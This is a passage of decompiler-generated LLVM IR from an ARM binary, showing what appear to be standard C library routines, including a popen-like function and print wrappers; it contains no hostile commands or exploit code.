  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_ce84, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_cfbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_cfbc:
  %v0_cfbc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_cfbc, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_cfbc
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_cfbc, %bb
  %v10_cfd4 = phi i32 [ %arg1, %dec_label_pc_cfbc ], [ 0, %bb ]
  ret i32 %v10_cfd4

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @function_cfd8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cfd8:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_cfe8 = call i32 @function_d500()
  ret i32 %v0_cfe8
}

define i32 @function_cff8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cff8:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_d00c = call i32 @function_d050()
  ret i32 %v0_d00c
}

define i32 @function_d01c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d01c:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_d028 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_d028, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_d03c = call i32 @function_d050()
  ret i32 %v0_d03c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ()* @function_d050, { 1, 0 }
}

define i32 @function_d050() local_unnamed_addr {
dec_label_pc_d050:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_d050 = load i32, i32* @r4, align 4
  %v6_d050 = load i32, i32* @r5, align 4
  %v9_d050 = load i32, i32* @r6, align 4
  %v12_d050 = load i32, i32* @r7, align 4
  %v18_d050 = load i32, i32* @sl, align 4
  %v2_d058 = ptrtoint i32* %stack_var_-112 to i32
  %v0_d05c = load i32, i32* @r0, align 4
  store i32 %v0_d05c, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_d064 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_d064, i32* @r0, align 4
  %v0_d06c = load i32, i32* @r3, align 4
  store i32 %v0_d06c, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_d078 = load i32, i32* @r1, align 4
  store i32 %v0_d078, i32* @r5, align 4
  %v0_d07c = load i32, i32* @r2, align 4
  store i32 %v0_d07c, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_d090 = call i32 @function_d870(i32 %v2_d064)
  %v0_d094 = load i32, i32* @r4, align 4
  %v1_d094 = sub i32 -1, %v0_d094
  %v0_d098 = load i32, i32* @r5, align 4
  %v3_d098 = icmp ult i32 %v0_d098, %v1_d094
  br i1 %v3_d098, label %bb26, label %bb

bb:                                               ; preds = %dec_label_pc_d050
  store i32 %v1_d094, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_d050, %bb
  %v1_d0a0 = phi i32 [ %v0_d098, %dec_label_pc_d050 ], [ %v1_d094, %bb ]
  %v2_d0a0 = add i32 %v1_d0a0, %v0_d094
  %v0_d0a8 = load i32, i32* @r6, align 4
  %v0_d0ac = load i32, i32* @r7, align 4
  %v0_d0b8 = load i32, i32* @sl, align 4
  %v5_d0c4 = inttoptr i32 %v0_d094 to i8*
  %v15_d0cc = inttoptr i32 %v0_d0a8 to i8*
  %v16_d0cc = call i32 @function_da80(i32 %v2_d058, i8* %v15_d0cc, i32 %v0_d0ac, i32 %v2_d0a0, i32 %v0_d094, i32 %v2_d0a0, i32 %v0_d094, i32 %v0_d094, i32 %v0_d094, i32 %v2_d0a0, i32 %v0_d0b8)
  %v0_d0d0 = load i32, i32* @r5, align 4
  %v1_d0d0 = load i32, i32* @sl, align 4
  %v9_d0d0 = icmp eq i32 %v0_d0d0, %v1_d0d0
  br i1 %v9_d0d0, label %dec_label_pc_d0f8, label %dec_label_pc_d0dc

dec_label_pc_d0dc:                                ; preds = %bb26
  %v3_d0a0 = inttoptr i32 %v2_d0a0 to i8*
  %v9_d0e4 = icmp eq i8* %v5_d0c4, %v3_d0a0
  br i1 %v9_d0e4, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_d0dc
  %v2_d0e8 = add i32 %v0_d094, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_d0dc, %bb27
  %v1_d0ec = phi i32 [ %v2_d0a0, %dec_label_pc_d0dc ], [ %v2_d0e8, %bb27 ]
  %v6_d0ec = inttoptr i32 %v1_d0ec to i8*
  %stack_var_-96.0 = select i1 %v9_d0e4, i8* %v6_d0ec, i8* %v5_d0c4
  %v1_d0f4 = trunc i32 %v1_d0d0 to i8
  store i8 %v1_d0f4, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_d0f8

dec_label_pc_d0f8:                                ; preds = %bb26, %bb28
  store i32 %v3_d050, i32* @r4, align 4
  store i32 %v6_d050, i32* @r5, align 4
  store i32 %v9_d050, i32* @r6, align 4
  store i32 %v12_d050, i32* @r7, align 4
  store i32 %v18_d050, i32* @sl, align 4
  ret i32 %v16_d0cc

; uselistorder directives
  uselistorder i32 %v2_d0a0, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_d094, { 2, 1, 0 }
  uselistorder i32 %v0_d094, { 2, 4, 5, 7, 3, 6, 1, 0 }
  uselistorder label %dec_label_pc_d0f8, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @function_d104(i32 %arg1) local_unnamed_addr {
dec_label_pc_d104:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d104 = load i32, i32* @r4, align 4
  %v6_d104 = load i32, i32* @r5, align 4
  %v9_d104 = load i32, i32* @r6, align 4
  %v12_d104 = load i32, i32* @lr, align 4
  store i32 142044, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_232b8.264 to i32), i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_d134 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_d134)
  %v0_d148 = load i32, i32* @r5, align 4
  %v2_d148 = add i32 %v0_d148, 16
  %v3_d148 = inttoptr i32 %v2_d148 to i32*
  %v4_d148 = load i32, i32* %v3_d148, align 4
  call void @__pseudo_branch(i32 %v4_d148)
  %v4_d158 = load i32, i32* @global_var_232d0.268, align 4
  store i32 %v4_d158, i32* %r4.global-to-local, align 4
  %v2_d15c = icmp eq i32 %v4_d158, 0
  br i1 %v2_d15c, label %dec_label_pc_d1ac, label %dec_label_pc_d164

dec_label_pc_d164:                                ; preds = %dec_label_pc_d104
  %v1_d164 = add i32 %v4_d158, 4
  %v2_d164 = inttoptr i32 %v1_d164 to i32*
  %v3_d164 = load i32, i32* %v2_d164, align 4
  %v1_d168 = load i32, i32* @r6, align 4
  %v9_d168 = icmp eq i32 %v3_d164, %v1_d168
  br i1 %v9_d168, label %.thread, label %dec_label_pc_d178

.thread:                                          ; preds = %dec_label_pc_d164
  %v2_d16c = inttoptr i32 %v4_d158 to i32*
  %v3_d16c = load i32, i32* %v2_d16c, align 4
  store i32 %v3_d16c, i32* @global_var_232d0.268, align 4
  br label %dec_label_pc_d1ac

dec_label_pc_d178:                                ; preds = %dec_label_pc_d164, %dec_label_pc_d198
  %v1_d1a8 = phi i32 [ %v2_d17c, %dec_label_pc_d198 ], [ %v4_d158, %dec_label_pc_d164 ]
  %v1_d17c = inttoptr i32 %v1_d1a8 to i32*
  %v2_d17c = load i32, i32* %v1_d17c, align 4
  store i32 %v2_d17c, i32* %r4.global-to-local, align 4
  %v2_d180 = icmp eq i32 %v2_d17c, 0
  br i1 %v2_d180, label %dec_label_pc_d188, label %dec_label_pc_d198

dec_label_pc_d188:                                ; preds = %dec_label_pc_d178
  %v0_d188 = call i32 @function_ce08()
  %v2_d190 = inttoptr i32 %v0_d188 to i32*
  store i32 22, i32* %v2_d190, align 4
  br label %dec_label_pc_d1ac

dec_label_pc_d198:                                ; preds = %dec_label_pc_d178
  %v1_d198 = add i32 %v2_d17c, 4
  %v2_d198 = inttoptr i32 %v1_d198 to i32*
  %v3_d198 = load i32, i32* %v2_d198, align 4
  %v9_d19c = icmp eq i32 %v3_d198, %v1_d168
  br i1 %v9_d19c, label %dec_label_pc_d1a4, label %dec_label_pc_d178

dec_label_pc_d1a4:                                ; preds = %dec_label_pc_d198
  %v1_d1a4 = inttoptr i32 %v2_d17c to i32*
  %v2_d1a4 = load i32, i32* %v1_d1a4, align 4
  store i32 %v2_d1a4, i32* %v1_d17c, align 4
  br label %dec_label_pc_d1ac

dec_label_pc_d1ac:                                ; preds = %.thread, %dec_label_pc_d104, %dec_label_pc_d188, %dec_label_pc_d1a4
  %v0_d1b8 = load i32, i32* @r5, align 4
  %v2_d1b8 = add i32 %v0_d1b8, 24
  %v3_d1b8 = inttoptr i32 %v2_d1b8 to i32*
  %v4_d1b8 = load i32, i32* %v3_d1b8, align 4
  store i32 53700, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_d1b8)
  %v0_d1c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_d1c4 = icmp eq i32 %v0_d1c4, 0
  br i1 %v2_d1c4, label %dec_label_pc_d214, label %dec_label_pc_d1cc

dec_label_pc_d1cc:                                ; preds = %dec_label_pc_d1ac
  store i32 %v0_d1c4, i32* @r0, align 4
  %v1_d1d0 = add i32 %v0_d1c4, 8
  %v2_d1d0 = inttoptr i32 %v1_d1d0 to i32*
  %v3_d1d0 = load i32, i32* %v2_d1d0, align 4
  store i32 %v3_d1d0, i32* @r4, align 4
  %v0_d1d4 = call i32 @function_108e4()
  %v0_d1d8 = load i32, i32* @r6, align 4
  %v1_d1dc = inttoptr i32 %v0_d1d8 to i16*
  %v2_d1dc = call i32 @function_ce24(i16* %v1_d1dc)
  %v2_d1e0 = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_d1e4

dec_label_pc_d1e4:                                ; preds = %dec_label_pc_d200, %dec_label_pc_d1cc
  %v0_d1ec = load i32, i32* @r4, align 4
  store i32 %v0_d1ec, i32* @r0, align 4
  %v3_d1f0 = call i32 @function_cc58(i32 %v0_d1ec, i32 %v2_d1e0, i32 0)
  %v1_d1f4 = icmp slt i32 %v3_d1f0, 0
  br i1 %v1_d1f4, label %dec_label_pc_d200, label %dec_label_pc_d214.loopexit

dec_label_pc_d200:                                ; preds = %dec_label_pc_d1e4
  %v0_d200 = call i32 @function_ce08()
  %v1_d204 = inttoptr i32 %v0_d200 to i32*
  %v2_d204 = load i32, i32* %v1_d204, align 4
  %v7_d208 = icmp eq i32 %v2_d204, 4
  br i1 %v7_d208, label %dec_label_pc_d1e4, label %dec_label_pc_d214

dec_label_pc_d214.loopexit:                       ; preds = %dec_label_pc_d1e4
  %v6_d1f8 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_d214

dec_label_pc_d214:                                ; preds = %dec_label_pc_d200, %dec_label_pc_d1ac, %dec_label_pc_d214.loopexit
  %storemerge = phi i32 [ %v6_d1f8, %dec_label_pc_d214.loopexit ], [ -1, %dec_label_pc_d1ac ], [ -1, %dec_label_pc_d200 ]
  store i32 %v3_d104, i32* %r4.global-to-local, align 4
  store i32 %v6_d104, i32* @r5, align 4
  store i32 %v9_d104, i32* @r6, align 4
  store i32 %v12_d104, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_d1c4, { 1, 0, 2 }
  uselistorder i32 %v2_d17c, { 0, 2, 3, 4, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_d214, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d1ac, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d178, { 1, 0 }
}

define i32 @function_d224(i64* %arg1) local_unnamed_addr {
dec_label_pc_d224:
  %v0_d224 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d224, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_d224
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_d224
  %tmp = ptrtoint i64* %arg1 to i32
  ret i32 %tmp
}

define i32 @function_d23c(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_d23c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d23c = load i32, i32* @r4, align 4
  store i32 %v3_d23c, i32* %stack_var_-20, align 4
  %v6_d23c = load i32, i32* @r5, align 4
  %v9_d23c = load i32, i32* @r6, align 4
  %v12_d23c = load i32, i32* @r7, align 4
  %v15_d23c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_d244 = load i8, i8* %arg2, align 1
  %v4_d244 = zext i8 %v3_d244 to i32
  store i32 %v4_d244, i32* %r3.global-to-local, align 4
  %v7_d250 = icmp eq i8 %v3_d244, 119
  br i1 %v7_d250, label %dec_label_pc_d28c, label %dec_label_pc_d264

dec_label_pc_d264:                                ; preds = %dec_label_pc_d23c
  %v7_d264 = icmp eq i8 %v3_d244, 114
  br i1 %v7_d264, label %bb, label %dec_label_pc_d274

bb:                                               ; preds = %dec_label_pc_d264
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d294

dec_label_pc_d274:                                ; preds = %dec_label_pc_d264
  %v0_d274 = call i32 @function_ce08()
  store i32 %v0_d274, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_d284 = inttoptr i32 %v0_d274 to i32*
  store i32 22, i32* %v2_d284, align 4
  br label %dec_label_pc_d4c8

dec_label_pc_d28c:                                ; preds = %dec_label_pc_d23c
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d294

dec_label_pc_d294:                                ; preds = %bb, %dec_label_pc_d28c
  %v0_d388 = phi i32 [ 0, %dec_label_pc_d28c ], [ 1, %bb ]
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_d298 = call i32 @function_fd60(i32 12)
  store i32 %v1_d298, i32* %r0.global-to-local, align 4
  store i32 %v1_d298, i32* %r3.global-to-local, align 4
  %v2_d29c = icmp eq i32 %v1_d298, 0
  br i1 %v2_d29c, label %dec_label_pc_d4c8, label %dec_label_pc_d2a8

dec_label_pc_d2a8:                                ; preds = %dec_label_pc_d294
  %v2_d2a8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_d2a8, i32* %r0.global-to-local, align 4
  %v1_d2b0 = call i32 @function_1245c(i32 %v2_d2a8)
  store i32 %v1_d2b0, i32* %r0.global-to-local, align 4
  %v2_d2b4 = icmp eq i32 %v1_d2b0, 0
  br i1 %v2_d2b4, label %dec_label_pc_d2bc, label %dec_label_pc_d4b8

dec_label_pc_d2bc:                                ; preds = %dec_label_pc_d2a8
  store i32 %v0_d388, i32* %r0.global-to-local, align 4
  %v2_d2c0 = ptrtoint i32* %stack_var_-24 to i32
  %v1_d2c4 = xor i32 %v0_d388, 1
  store i32 -8, i32* %r2.global-to-local, align 4
  %tmp26 = sub nsw i32 0, %v1_d2c4
  %v4_d2cc = and i32 %tmp26, 4
  %v5_d2cc = add i32 %v4_d2cc, %v2_d2c0
  store i32 %v5_d2cc, i32* %r3.global-to-local, align 4
  %v2_d2d0 = add i32 %v5_d2cc, -8
  %v3_d2d0 = inttoptr i32 %v2_d2d0 to i32*
  %v4_d2d0 = load i32, i32* %v3_d2d0, align 4
  store i32 %v2_d2c0, i32* @ip, align 4
  %tmp27 = sub nsw i32 0, %v0_d388
  %v4_d2dc = and i32 %tmp27, 4
  %v5_d2dc = add i32 %v4_d2dc, %v2_d2c0
  store i32 %v5_d2dc, i32* %r3.global-to-local, align 4
  %v2_d2e0 = add i32 %v5_d2dc, -8
  %v3_d2e0 = inttoptr i32 %v2_d2e0 to i32*
  %v4_d2e0 = load i32, i32* %v3_d2e0, align 4
  store i32 %v4_d2e0, i32* @r3, align 4
  %v0_d2e4 = load i32, i32* @r4, align 4
  store i32 %v4_d2d0, i32* %r0.global-to-local, align 4
  %v7_d2f0 = call i32 @function_1308c(i32 %v4_d2d0, i32 %v0_d2e4, i32 -8, i32 %v4_d2e0, i32 %v4_d2d0, i32 %v4_d2e0)
  store i32 %v7_d2f0, i32* %r0.global-to-local, align 4
  %v2_d2f4 = icmp eq i32 %v7_d2f0, 0
  br i1 %v2_d2f4, label %dec_label_pc_d300, label %dec_label_pc_d314

dec_label_pc_d300:                                ; preds = %dec_label_pc_d2bc
  store i32 %v4_d2d0, i32* %r0.global-to-local, align 4
  %v1_d304 = call i32 @function_cda4(i32 %v4_d2d0)
  store i32 %v4_d2e0, i32* %r0.global-to-local, align 4
  %v1_d30c = call i32 @function_cda4(i32 %v4_d2e0)
  store i32 %v1_d30c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d4b8

dec_label_pc_d314:                                ; preds = %dec_label_pc_d2bc
  store i32 142044, i32* %r0.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 2012, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_232b8.264 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_232b8.264 to i32), i32* %r2.global-to-local, align 4
  %v2_d334 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_d334, i32* %r0.global-to-local, align 4
  store i32 142044, i32* %ip.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_d340 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  store i32 %v4_d340, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d340)
  %v0_d34c = load i32, i32* @r4, align 4
  store i32 %v0_d34c, i32* @r0, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v4_d358 = load i32, i32* inttoptr (i32 142060 to i32*), align 4
  store i32 %v4_d358, i32* %ip.global-to-local, align 4
  store i32 54116, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_d358)
  %v0_d364 = call i32 @function_12320()
  store i32 %v0_d364, i32* %r0.global-to-local, align 4
  store i32 %v0_d364, i32* @r5, align 4
  %v2_d368 = icmp eq i32 %v0_d364, 0
  br i1 %v2_d368, label %dec_label_pc_d370, label %dec_label_pc_d3fc

dec_label_pc_d370:                                ; preds = %dec_label_pc_d314
  store i32 %v4_d2d0, i32* %r0.global-to-local, align 4
  %v1_d374 = call i32 @function_cda4(i32 %v4_d2d0)
  store i32 %v1_d374, i32* %r0.global-to-local, align 4
  store i32 %v4_d2e0, i32* %r2.global-to-local, align 4
  store i32 %v0_d388, i32* %r3.global-to-local, align 4
  %v9_d380 = icmp eq i32 %v4_d2e0, %v0_d388
  br i1 %v9_d380, label %dec_label_pc_d39c, label %dec_label_pc_d388

dec_label_pc_d388:                                ; preds = %dec_label_pc_d370
  store i32 %v4_d2e0, i32* %r0.global-to-local, align 4
  %v2_d390 = call i32 @function_12394(i32 %v4_d2e0, i32 %v0_d388)
  store i32 %v4_d2e0, i32* %r0.global-to-local, align 4
  %v1_d398 = call i32 @function_cda4(i32 %v4_d2e0)
  store i32 %v1_d398, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d39c

dec_label_pc_d39c:                                ; preds = %dec_label_pc_d370, %dec_label_pc_d388
  store i32 2036, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %ip.global-to-local, align 4
  %storemerge3 = load i32, i32* @global_var_232d0.268, align 4
  store i32 %storemerge3, i32* @r4, align 4
  %v2_d3bc5 = icmp eq i32 %storemerge3, 0
  br i1 %v2_d3bc5, label %dec_label_pc_d3c4, label %dec_label_pc_d3ac

dec_label_pc_d3ac:                                ; preds = %dec_label_pc_d39c, %dec_label_pc_d3ac
  %v0_d3ac = phi i32 [ %storemerge, %dec_label_pc_d3ac ], [ %storemerge3, %dec_label_pc_d39c ]
  %v1_d3ac = add i32 %v0_d3ac, 4
  %v2_d3ac = inttoptr i32 %v1_d3ac to i32*
  %v3_d3ac = load i32, i32* %v2_d3ac, align 4
  store i32 %v3_d3ac, i32* %r3.global-to-local, align 4
  %v1_d3b0 = add i32 %v3_d3ac, 4
  %v2_d3b0 = inttoptr i32 %v1_d3b0 to i32*
  %v3_d3b0 = load i32, i32* %v2_d3b0, align 4
  store i32 %v3_d3b0, i32* %r0.global-to-local, align 4
  %v1_d3b4 = call i32 @function_cda4(i32 %v3_d3b0)
  store i32 %v1_d3b4, i32* %r0.global-to-local, align 4
  %v0_d3b8 = load i32, i32* @r4, align 4
  %v1_d3b8 = inttoptr i32 %v0_d3b8 to i32*
  %storemerge = load i32, i32* %v1_d3b8, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_d3bc = icmp eq i32 %storemerge, 0
  br i1 %v2_d3bc, label %dec_label_pc_d3c4, label %dec_label_pc_d3ac

dec_label_pc_d3c4:                                ; preds = %dec_label_pc_d3ac, %dec_label_pc_d39c
  store i32 ptrtoint ([3 x i8]* @global_var_196f8.277 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_196ec.279 to i32), i32* @r0, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v8_d3f0 = call i32 @function_11d14(i32 ptrtoint ([8 x i8]* @global_var_196ec.279 to i32), i32 ptrtoint ([3 x i8]* @global_var_196f4.281 to i32), i32 ptrtoint ([3 x i8]* @global_var_196f8.277 to i32), i32 %arg1, i32 0)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_d3f8 = call i32 @function_12748(i32 127)
  store i32 %v1_d3f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d3fc

dec_label_pc_d3fc:                                ; preds = %dec_label_pc_d314, %dec_label_pc_d3c4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %ip.global-to-local, align 4
  store i32 %v2_d334, i32* @r6, align 4
  %v4_d408 = load i32, i32* inttoptr (i32 142068 to i32*), align 4
  store i32 %v4_d408, i32* @r7, align 4
  store i32 %v2_d334, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_d41c.283 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_d408)
  store i32 %v4_d2e0, i32* %r0.global-to-local, align 4
  %v1_d420 = call i32 @function_cda4(i32 %v4_d2e0)
  store i32 %v1_d420, i32* %r0.global-to-local, align 4
  %v0_d424 = load i32, i32* @r5, align 4
  %tmp29 = icmp slt i32 %v0_d424, 1
  br i1 %tmp29, label %dec_label_pc_d4b0, label %dec_label_pc_d42c

dec_label_pc_d42c:                                ; preds = %dec_label_pc_d3fc
  store i32 %v7_d2f0, i32* %r3.global-to-local, align 4
  store i32 %v1_d298, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_232b8.264 to i32), i32* %r4.global-to-local, align 4
  store i32 142044, i32* %ip.global-to-local, align 4
  %v2_d448 = add i32 %v1_d298, 8
  %v3_d448 = inttoptr i32 %v2_d448 to i32*
  store i32 %v0_d424, i32* %v3_d448, align 4
  %v0_d44c = load i32, i32* %r3.global-to-local, align 4
  %v1_d44c = load i32, i32* %r2.global-to-local, align 4
  %v2_d44c = add i32 %v1_d44c, 4
  %v3_d44c = inttoptr i32 %v2_d44c to i32*
  store i32 %v0_d44c, i32* %v3_d44c, align 4
  %v0_d454 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d454, i32* %r2.global-to-local, align 4
  store i32 %v2_d334, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_d460 = load i32, i32* %ip.global-to-local, align 4
  %v2_d460 = add i32 %v0_d460, 76
  %v3_d460 = inttoptr i32 %v2_d460 to i32*
  %v4_d460 = load i32, i32* %v3_d460, align 4
  store i32 %v4_d460, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d460)
  %v0_d470 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d470, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v4_d478 = load i32, i32* inttoptr (i32 142060 to i32*), align 4
  store i32 %v4_d478, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d478)
  store i32 2036, i32* %r2.global-to-local, align 4
  store i32 142044, i32* @ip, align 4
  store i32 %v1_d298, i32* %r0.global-to-local, align 4
  %v4_d490 = load i32, i32* @global_var_232d0.268, align 4
  store i32 %v4_d490, i32* %r3.global-to-local, align 4
  %v2_d498 = inttoptr i32 %v1_d298 to i32*
  store i32 %v4_d490, i32* %v2_d498, align 4
  %v0_d49c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d49c, i32* @global_var_232d0.268, align 4
  store i32 %v2_d334, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d408)
  br label %dec_label_pc_d4c8

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d3fc
  store i32 %v7_d2f0, i32* %r0.global-to-local, align 4
  %v1_d4b4 = inttoptr i32 %v7_d2f0 to i16*
  %v2_d4b4 = call i32 @function_ce24(i16* %v1_d4b4)
  store i32 %v2_d4b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d4b8

dec_label_pc_d4b8:                                ; preds = %dec_label_pc_d2a8, %dec_label_pc_d300, %dec_label_pc_d4b0
  store i32 %v1_d298, i32* @r0, align 4
  %v0_d4bc = call i32 @function_108e4()
  store i32 %v0_d4bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d4c8

dec_label_pc_d4c8:                                ; preds = %dec_label_pc_d294, %dec_label_pc_d42c, %dec_label_pc_d274, %dec_label_pc_d4b8
  %stack_var_-68.1 = phi i32 [ 0, %dec_label_pc_d294 ], [ 0, %dec_label_pc_d4b8 ], [ %v7_d2f0, %dec_label_pc_d42c ], [ 0, %dec_label_pc_d274 ]
  store i32 %stack_var_-68.1, i32* %r0.global-to-local, align 4
  %v2_d4d0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d4d0, i32* @r4, align 4
  store i32 %v6_d23c, i32* @r5, align 4
  store i32 %v9_d23c, i32* @r6, align 4
  store i32 %v12_d23c, i32* @r7, align 4
  store i32 %v15_d23c, i32* @lr, align 4
  ret i32 %stack_var_-68.1

; uselistorder directives
  uselistorder i32 %stack_var_-68.1, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v7_d2f0, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v4_d2e0, { 3, 2, 1, 0, 7, 6, 9, 8, 5, 4, 11, 10, 12 }
  uselistorder i32 %v4_d2d0, { 1, 0, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_d2c0, { 0, 2, 1 }
  uselistorder i32 %v1_d298, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32 %v0_d388, { 1, 4, 3, 0, 2, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 10, 4, 5, 6, 7, 8, 9, 13, 11, 12, 14, 15, 17, 16, 19, 18, 20, 22, 21, 34, 23, 24, 26, 25, 27, 1, 28, 29, 35, 30, 32, 31, 33, 0 }
  uselistorder i32* @global_var_232d0.268, { 1, 2, 0, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_232b8.264 to i32), { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d4c8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_d4b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d3fc, { 1, 0 }
  uselistorder label %dec_label_pc_d3ac, { 1, 0 }
  uselistorder label %dec_label_pc_d39c, { 1, 0 }
  uselistorder label %dec_label_pc_d294, { 1, 0 }
}

define i32 @function_d4dc(i64* %arg1) local_unnamed_addr {
dec_label_pc_d4dc:
  %v0_d4dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d4dc, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_d4dc
  call void @llvm.trap()
  unreachable

.thread3:                                         ; preds = %dec_label_pc_d4dc
  %tmp = ptrtoint i64* %arg1 to i32
  ret i32 %tmp
}

define i32 @function_d500() local_unnamed_addr {
dec_label_pc_d500:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_d500 = load i32, i32* @r4, align 4
  store i32 %v3_d500, i32* %stack_var_-36, align 4
  %v6_d500 = load i32, i32* @r5, align 4
  %v9_d500 = load i32, i32* @r6, align 4
  %v18_d500 = load i32, i32* @sb, align 4
